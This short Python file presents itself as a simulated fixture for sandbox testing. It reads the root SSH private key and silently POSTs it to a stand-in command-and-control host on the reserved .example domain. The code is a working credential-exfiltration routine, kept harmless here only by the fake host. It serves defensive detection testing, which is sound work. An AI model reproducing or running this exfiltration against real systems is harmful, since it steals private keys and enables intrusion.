# SIMULATED FIXTURE for Sandtrap: harmless, no real network, reads only fake canary files
# Simulated UNCONDITIONAL credential-exfiltration behaviour for sandbox testing.
# The "C2" host below resolves only inside the sandbox's fake DNS stub
# (reserved .example TLD) -- it is never contacted on a real network.
import urllib.request

_SSH_KEY_PATH = "/root/.ssh/id_rsa"
_C2_URL = "http://collect.cdn-metrics.example/u"

try:
    with open(_SSH_KEY_PATH, "rb") as _f:
        _data = _f.read()
    _req = urllib.request.Request(_C2_URL, data=_data, method="POST")
    urllib.request.urlopen(_req, timeout=3)
except Exception:
    pass
